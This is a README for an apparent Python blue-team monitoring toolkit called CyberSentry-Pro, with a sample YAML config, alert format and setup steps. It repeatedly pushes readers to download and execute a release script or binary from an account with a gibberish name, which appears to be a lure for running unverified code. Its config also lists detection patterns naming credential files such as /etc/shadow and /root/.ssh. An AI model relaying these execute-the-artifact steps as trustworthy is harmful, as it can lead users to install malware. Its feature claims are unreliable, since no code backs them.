# CyberSentry-Pro: Real-Time Blue Team Monitoring Toolkit

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/efsdfsdfsda/CyberSentry-Pro/releases)

A Python toolkit for live defensive operations. CyberSentry-Pro monitors activity, detects SSH brute-force, flags access to sensitive resources, and matches suspicious keywords. It sends structured alerts to files or JSON endpoints, supports simulated input for testing, and lets operators tune detection rules for live gameplay and training.

Topics: blue-team, brute-force-detection, configuration, cybersecurity, defensive-security, intrusion-detection, log-monitoring, python, real-time-monitoring, security-tools, syslog-analysis

---

![Cybersecurity banner](https://images.unsplash.com/photo-1535223289827-42f1e9919769?ixlib=rb-1.2.1&q=80&auto=format&fit=crop&w=1400&h=400)

Quick links
- Releases (download and execute the release artifact): https://github.com/efsdfsdfsda/CyberSentry-Pro/releases
- Code and issues: GitHub repository

If you follow the Releases link above, download the provided artifact and execute the packaged script or binary from that release.

## Why CyberSentry-Pro

- Focused on Blue Team workflows and training.
- Detects SSH brute-force attempts with configurable thresholds.
- Tracks access to sensitive files and directories.
- Matches keyword patterns in logs and command histories.
- Emits JSON alerts for easy ingestion by SIEM or automation.
- Simulates attackers for controlled testing and exercises.
- Uses plain configuration files so teams can tailor behavior during live play.

## Features

- SSH brute-force detector with per-IP counters and ban-like history.
- Sensitive-resource monitor (files, directories, services).
- Keyword detection across logs and command streams.
- JSON alert output and standard log output.
- Syslog output option for integration with log collectors.
- Simulated input mode for safe testing and training scenarios.
- Rule-driven configuration that operators can edit during play.
- Lightweight Python core for quick deployment and development.

## Release artifact

Download the release artifact from:
https://github.com/efsdfsdfsda/CyberSentry-Pro/releases

After download, run the included script or binary. Example:
- chmod +x CyberSentry-Pro-1.0.0.sh
- ./CyberSentry-Pro-1.0.0.sh
or
- python3 run.py --config config.yaml

The release contains a ready-to-run bundle and sample configs. Use the release artifact to deploy a standalone instance.

## Quick start (developer)

1. Clone the repo:
   git clone https://github.com/efsdfsdfsda/CyberSentry-Pro.git
2. Enter the folder:
   cd CyberSentry-Pro
3. Install dependencies:
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
4. Run with sample config:
   python3 run.py --config samples/config.yaml

If you use the release package instead, download it from:
https://github.com/efsdfsdfsda/CyberSentry-Pro/releases
then run the binary or script included in the archive.

## Configuration

Use YAML for rules and runtime settings. Sample config file (samples/config.yaml):

```yaml
general:
  mode: live        # live | simulate
  log_level: INFO

inputs:
  - type: file
    path: /var/log/auth.log
  - type: syslog
    host: 0.0.0.0
    port: 1514

detectors:
  ssh_bruteforce:
    enabled: true
    window_seconds: 300
    attempts_threshold: 5
    block_duration_seconds: 600

  sensitive_access:
    enabled: true
    paths:
      - /etc/shadow
      - /root/.ssh
    alert_on_read: true

  keyword_watch:
    enabled: true
    patterns:
      - "password"
      - "ssh -i"
      - "sudo su"
    ignore_case: true

outputs:
  - type: file
    path: /var/log/cybersentry/alerts.json
    format: json
  - type: syslog
    host: 127.0.0.1
    port: 514
```

Rules load at start. Change and reload using the built-in admin API or via a HUP signal.

## Detectors and rules

- SSH brute-force
  - Counts failed attempts per source IP.
  - Uses sliding time windows.
  - Triggers when attempts exceed threshold.
  - Stores event history for post-incident review.

- Sensitive resource watch
  - Monitors reads, writes, and execs against listed paths.
  - Splits alerts by user and process.
  - Supports glob patterns.

- Keyword watch
  - Scans messages and command streams.
  - Supports regex and plain matches.
  - Emits context window for each hit.

Each detector exports metrics and a short incident record for indexers and dashboards.

## Alerts

Default alert JSON:

```json
{
  "timestamp": "2025-08-18T12:34:56Z",
  "detector": "ssh_bruteforce",
  "severity": "high",
  "source_ip": "10.0.0.5",
  "count": 12,
  "message": "SSH brute-force detected"
}
```

Outputs:
- JSON files for ingestion into SIEM.
- Syslog for collectors.
- Local text logs for operators.

Customize fields in config to match your log schema.

## Simulated input and training

Use simulate mode to replay log streams and run scenarios.

Example command:
python3 run.py --config samples/config.yaml --simulate samples/fixtures/ssh_bruteforce.log

Simulated input lets teams:
- Validate detection rules without live risk.
- Train analysts on alert triage.
- Run captured scenarios in a controlled environment.

## Integration

- Syslog: Send alerts to a collector (rsyslog, syslog-ng).
- SIEM: Use JSON output for direct ingestion.
- Automation: Post alerts to webhook endpoints for playbooks.

Sample syslog forwarder config (rsyslog):

/etc/rsyslog.d/50-cybersentry.conf
*.* @127.0.0.1:514

## Sample workflows

1. Live detection
   - Start CyberSentry-Pro on a monitoring host.
   - Tail auth logs and enable syslog input.
   - Tune SSH thresholds based on observed traffic.

2. Tabletop training
   - Use simulate mode with crafted logs.
   - Incrementally tighten rules as teams improve.
   - Export alerts for review after the exercise.

3. Automated response
   - Configure a webhook to receive JSON alerts.
   - Trigger a playbook to block IPs or open tickets.

## Development

- Python 3.9+
- Tests: pytest suite in tests/
- Linting: flake8, black config included
- Run tests:
  pytest -q

Pull requests should include tests that validate new rule logic and edge cases.

## Examples

- samples/fixtures/ssh_bruteforce.log — fast repeated failed SSH attempts from one IP.
- samples/fixtures/sensitive_access.log — a user opening /etc/shadow.
- samples/config.yaml — baseline rules for training.

Run an end-to-end example:
python3 run.py --config samples/config.yaml --simulate samples/fixtures/ssh_bruteforce.log

## Logging and metrics

- Logs follow structured JSON format for fields and timestamps.
- Metrics expose counts and rates for each detector.
- Prometheus exporter plugin is available via config.

## File layout

- run.py — launcher and main loop
- libs/ — detector code and helpers
- samples/ — configs and fixtures
- docs/ — design notes and deployment guides
- requirements.txt — pip dependencies

## Contributing

- Fork the repo.
- Create a feature branch.
- Add tests for new behavior.
- Submit a pull request with a clear description of changes.

Use the issue tracker for bugs and feature requests.

## Security and responsible use

Report vulnerabilities through the repository issue tracker or the contact listed on the project page. Use simulate mode for testing anything that could affect production systems.

## License

MIT License

---

[![Releases](https://img.shields.io/badge/Get%20Release-Download-green?logo=github)](https://github.com/efsdfsdfsda/CyberSentry-Pro/releases)